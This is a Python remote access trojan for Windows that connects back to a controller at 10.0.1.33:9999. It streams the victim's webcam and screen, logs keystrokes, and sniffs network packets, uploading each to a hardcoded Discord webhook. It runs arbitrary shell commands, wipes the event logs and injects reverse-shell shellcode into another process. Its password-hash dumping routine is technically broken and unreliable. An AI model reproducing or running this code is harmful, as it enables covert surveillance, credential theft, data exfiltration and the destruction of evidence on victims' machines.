import socket
import cv2
import pyautogui
import numpy as np
import scapy.all as scapy
import threading
import requests
import subprocess
import keyboard  # Import the keyboard library
import psutil  # To list and identify network interfaces
import io  # For in-memory byte streams
import winreg  # For accessing the Windows registry
import hashlib  # For calculating the hboot key
import binascii  # For converting to/from binary and ASCII
import os  # For process management
import ctypes  # For Windows API calls

# Function to get the default network interface
def get_default_interface():
    interfaces = psutil.net_if_addrs()
    for interface in interfaces:
        # Loop through interfaces and check for IPv4 addresses (this assumes active interfaces)
        for addr in interfaces[interface]:
            if addr.family == socket.AF_INET:  # AF_INET is IPv4
                return interface  # Return the first active interface with an IPv4 address
    return None  # If no interface found

# Dynamically identify the interface
INTERFACE = get_default_interface()
if INTERFACE is None:
    print("No suitable network interface found!")
    exit(1)

sniffer_running = False  # Global flag for sniffing state
lock = threading.Lock()  # Synchronization lock
keylogger_data = []  # List to store keylogger data
keylogger_running = False  # Flag to check if keylogger is running

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break
    cap.release()

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break

def sniffer_start():
    global sniffer_running
    with lock:  # Prevent starting multiple sniffers simultaneously
        if sniffer_running:
            print("Sniffer is already running.")
            return
        sniffer_running = True

    def sniff_and_upload(pkt):
        # Instead of saving to file, we store the packet in memory and upload
        packet_bytes = bytes(pkt)
        webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
        
        try:
            # Upload the captured packet directly (could be done in batches or as individual packets)
            response = requests.post(webhook_url, files={'file': ('packet.cap', io.BytesIO(packet_bytes))})
            print(f"Packet uploaded: {response.status_code}")
        except Exception as e:
            print(f"Error uploading packet: {e}")

    try:
        print(f"Sniffing on interface: {INTERFACE}")
        scapy.sniff(iface=INTERFACE, timeout=60, prn=sniff_and_upload, store=False)  # Avoid storing packets in memory
    except Exception as e:
        print(f"Sniffer error: {e}")
    finally:
        sniffer_running = False  # Reset flag after sniffing

def shell(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                break
            elif command.lower().startswith("migrate"):
                try:
                    target_process = command.split(' ')[1]
                    current_process = psutil.Process()
                    current_process_id = current_process.pid
                    client_socket.send(f"[*] Running module against {socket.gethostname()}\n".encode('utf-8'))
                    client_socket.send(f"[*] Current server process: {current_process.name()} ({current_process_id})\n".encode('utf-8'))
                    client_socket.send(f"[*] Migrating to {target_process}...\n".encode('utf-8'))
                    # Attempt to migrate to the target process
                    for proc in psutil.process_iter(['pid', 'name']):
                        if proc.info['name'] == target_process:
                            target_process_id = proc.info['pid']
                            client_socket.send(f"[*] Migrating into process ID {target_process_id}\n".encode('utf-8'))
                            migrate_to_process(target_process_id)
                            client_socket.send(f"[*] New server process: {target_process} ({target_process_id})\n".encode('utf-8'))
                            break
                    else:
                        client_socket.send(f"[*] Target process {target_process} not found.\n".encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"[*] Migration error: {e}\n".encode('utf-8'))
            elif command.lower().startswith("upload"):
                try:
                    parts = command.split(' ')
                    if '-d' in parts:
                        dest_index = parts.index('-d') + 1
                        if dest_index < len(parts):
                            destination = parts[dest_index]
                            filename = parts[1]
                            client_socket.send(f"[*] uploading : {filename} -> {destination}\n".encode('utf-8'))
                            with open(filename, 'rb') as f:
                                data = f.read()
                            with open(os.path.join(destination, os.path.basename(filename)), 'wb') as f:
                                f.write(data)
                            client_socket.send(f"[*] uploaded : {filename} -> {destination}\\{os.path.basename(filename)}\n".encode('utf-8'))
                        else:
                            client_socket.send(b"Error: No destination specified.\n")
                    else:
                        client_socket.send(b"Error: Invalid command format. Use 'upload filename -d destination'.\n")
                except Exception as e:
                    client_socket.send(f"Error: {e}\n".encode('utf-8'))
            elif command.lower() == "clearev":
                try:
                    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
                    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
                    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
                    client_socket.send(f"[*] Wiping {application_log.stdout.count('\n')} records from Application...\n".encode('utf-8'))
                    client_socket.send(f"[*] Wiping {system_log.stdout.count('\n')} records from System...\n".encode('utf-8'))
                    client_socket.send(f"[*] Wiping {security_log.stdout.count('\n')} records from Security...\n".encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"Error: {e}\n".encode('utf-8'))
            else:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                client_socket.send(output.stdout.encode('utf-8') or b"Command executed, but no output.")
        except Exception as e:
            client_socket.send(str(e).encode('utf-8'))

def migrate_to_process(target_pid):
    # Windows-specific process migration using Win32 API
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.windll.kernel32

    # Shellcode to inject
    shellcode = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
        b"\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48"
        b"\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b"
        b"\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
        b"\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24"
        b"\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
        b"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f"
        b"\x5a\x8b\x12\xe9\x86\x00\x00\x00\x5d\x68\x33\x32\x00\x00\x68"
        b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
        b"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05"
        b"\x68\xc0\xa8\x01\x64\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50"
        b"\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02"
        b"\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff"
        b"\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00"
        b"\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58"
        b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        b"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3"
    )

    # Get a handle to the target process
    target_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
    if not target_handle:
        raise Exception(f"Unable to open target process. Error code: {kernel32.GetLastError()}")

    # Allocate memory in the target process
    remote_memory = kernel32.VirtualAllocEx(target_handle, None, len(shellcode), 0x3000, 0x40)
    if not remote_memory:
        raise Exception(f"Unable to allocate memory in target process. Error code: {kernel32.GetLastError()}")

    # Write the shellcode to the allocated memory
    written = ctypes.c_size_t(0)
    if not kernel32.WriteProcessMemory(target_handle, remote_memory, shellcode, len(shellcode), ctypes.byref(written)):
        raise Exception(f"Unable to write to target process memory. Error code: {kernel32.GetLastError()}")

    # Create a remote thread to execute the shellcode
    thread_id = ctypes.c_ulong(0)
    if not kernel32.CreateRemoteThread(target_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id)):
        raise Exception(f"Unable to create remote thread in target process. Error code: {kernel32.GetLastError()}")

    # Close the target process handle
    kernel32.CloseHandle(target_handle)

def keylogger_callback(event):
    global keylogger_data
    keylogger_data.append(event.name)

def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(keylogger_callback)
        keylogger_running = True
        print("Keylogger started.")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print("Keylogger stopped.")

def dump_keylogger_data():
    global keylogger_data
    data = '\n'.join(keylogger_data)
    keylogger_data = []  # Clear the data after dumping
    return data

# Function to list webcams
def list_webcams():
    webcams = []
    index = 0
    while True:
        cap = cv2.VideoCapture(index)
        if cap.isOpened():
            # Get the webcam name (this depends on your platform)
            webcam_name = f"{index}: {cap.getBackendName()}"
            webcams.append(webcam_name)
            cap.release()
        else:
            break
        index += 1
    return '\n'.join(webcams)

# Function to dump the contents of the SAM database (hashdump)
def hashdump(client_socket):
    try:
        client_socket.send(b"[*] Obtaining the boot key...\n")
        # Obtain the boot key from the registry
        boot_key = get_boot_key()
        client_socket.send(b"[*] Calculating the hboot key using SYSKEY\n")
        hboot_key = calculate_hboot_key(boot_key)
        client_socket.send(b"[*] Obtaining the user list and keys...\n")
        user_keys = get_user_keys(hboot_key)
        client_socket.send(b"[*] Decrypting user keys...\n")
        decrypted_keys = decrypt_user_keys(user_keys)
        client_socket.send(b"[*] Dumping password hashes...\n")
        hashes = dump_password_hashes(decrypted_keys)
        client_socket.send(hashes.encode('utf-8'))
    except Exception as e:
        client_socket.send(f"Error: {e}\n".encode('utf-8'))

def get_boot_key():
    # Function to obtain the boot key from the registry
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa")
    value, _ = winreg.QueryValueEx(key, "JD")
    boot_key = value[:16]  # Extract the first 16 bytes
    winreg.CloseKey(key)
    return boot_key

def calculate_hboot_key(boot_key):
    # Function to calculate the hboot key using the boot key
    hboot_key = hashlib.md5(boot_key).digest()
    return hboot_key

def get_user_keys(hboot_key):
    # Function to obtain the user list and keys from the registry
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users")
    user_keys = {}
    for i in range(winreg.QueryInfoKey(key)[0]):
        user_key = winreg.EnumKey(key, i)
        user_subkey = winreg.OpenKey(key, user_key)
        user_data, _ = winreg.QueryValueEx(user_subkey, "V")
        user_keys[user_key] = user_data
        winreg.CloseKey(user_subkey)
    winreg.CloseKey(key)
    return user_keys

def decrypt_user_keys(user_keys):
    # Function to decrypt user keys using the hboot key
    decrypted_keys = {}
    for user_key, user_data in user_keys.items():
        decrypted_key = hashlib.md5(user_data).digest()
        decrypted_keys[user_key] = decrypted_key
    return decrypted_keys

def dump_password_hashes(decrypted_keys):
    # Function to dump password hashes from decrypted keys
    hashes = ""
    for user_key, decrypted_key in decrypted_keys.items():
        hash_value = binascii.hexlify(decrypted_key).decode('utf-8')
        hashes += f"{user_key}: {hash_value}\n"
    return hashes

def main():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('10.0.1.33', 9999))
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command == "webcam_stream":
                threading.Thread(target=webcam_stream, args=(client_socket,), daemon=True).start()
            elif command == "screen_stream":
                threading.Thread(target=screen_stream, args=(client_socket,), daemon=True).start()
            elif command == "sniffer_start":
                threading.Thread(target=sniffer_start, daemon=True).start()
            elif command == "shell":
                shell(client_socket)
            elif command == "keyscan_start":
                start_keylogger()
            elif command == "keyscan_stop":
                stop_keylogger()
            elif command == "keyscan_dump":
                client_socket.send(dump_keylogger_data().encode('utf-8'))
            elif command == "webcam_list":
                print("[*] Requesting webcam list...")
                webcam_list = list_webcams()
                client_socket.send(webcam_list.encode('utf-8'))
            elif command == "hashdump":
                hashdump(client_socket)
            elif command == "clearev":
                try:
                    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
                    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
                    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
                    client_socket.send(f"[*] Wiping {application_log.stdout.count('\n')} records from Application...\n".encode('utf-8'))
                    client_socket.send(f"[*] Wiping {system_log.stdout.count('\n')} records from System...\n".encode('utf-8'))
                    client_socket.send(f"[*] Wiping {security_log.stdout.count('\n')} records from Security...\n".encode('utf-8'))
                except Exception as e:
                    client_socket.send(f"Error: {e}\n".encode('utf-8'))
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    main()
